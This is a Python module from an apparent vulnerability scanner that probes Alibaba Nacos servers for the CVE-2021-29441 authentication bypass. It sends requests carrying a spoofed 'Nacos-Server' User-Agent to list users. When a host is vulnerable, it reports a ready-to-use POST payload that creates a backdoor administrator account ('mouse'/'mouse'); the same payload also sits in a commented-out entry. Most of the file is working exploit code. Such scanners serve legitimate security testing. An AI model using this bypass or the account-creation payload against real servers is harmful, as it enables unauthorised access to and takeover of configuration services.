#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    AlibabaNacos扫描类: 
        Nacos 未授权访问
            CVE-2021-29441(nacos-4593)
                https://github.com/alibaba/nacos/issues/4593
'''

from lib.initial.config import config
from lib.tool.md5 import md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests

class Nacos():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'AlibabaNacos'

        self.cve_2021_29441_payloads = [
            {
                'path': 'nacos/v1/auth/users?pageNo=1&pageSize=10',
                'data': ''
            },
            {
                'path': 'v1/auth/users?pageNo=1&pageSize=10',
                'data': ''
            }
            # {    利用漏洞创建后台用户
            #     'path': '/nacos/v1/auth/users?username=mouse&password=mouse',
            #     'data': ''
            # }
        ]

    def cve_2021_29441_scan(self, url):
        ''' 阿里巴巴Nacos未授权访问漏洞
                可以通过该漏洞添加nacos后台用户, 并登录nacos管理后台
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'unAuthorized'
        vul_info['vul_id'] = 'CVE-2021-29441'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {
            'User-Agent': 'Nacos-Server'
        }

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        for payload in self.cve_2021_29441_payloads:    # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,                    # * 使用特殊headers
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                vul_info['status_code'] = str(res.status_code)
                logger.logging(vul_info)                        # * LOG
            except requests.ConnectTimeout:
                vul_info['status_code'] = 'Timeout'
                logger.logging(vul_info)
                return None
            except requests.ConnectionError:
                vul_info['status_code'] = 'Faild'
                logger.logging(vul_info)
                return None
            except:
                vul_info['status_code'] = 'Error'
                logger.logging(vul_info)
                return None

            if (('pagesAvailable' in res.text) or ('"username":"nacos"' in res.text)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Payload-See User List': {
                        'Method': 'GET',
                        'Path': path,
                        'Headers': str(vul_info['headers'])
                    },
                    'Payload-Add User': {
                        'Method': 'POST',
                        'Path': 'nacos/v1/auth/users?username=mouse&password=mouse',
                        'Headers': str(vul_info['headers'])
                    }
                }
                return results

    def addscan(self, url):
        return [
            thread(target=self.cve_2021_29441_scan, url=url),
        ]

nacos = Nacos()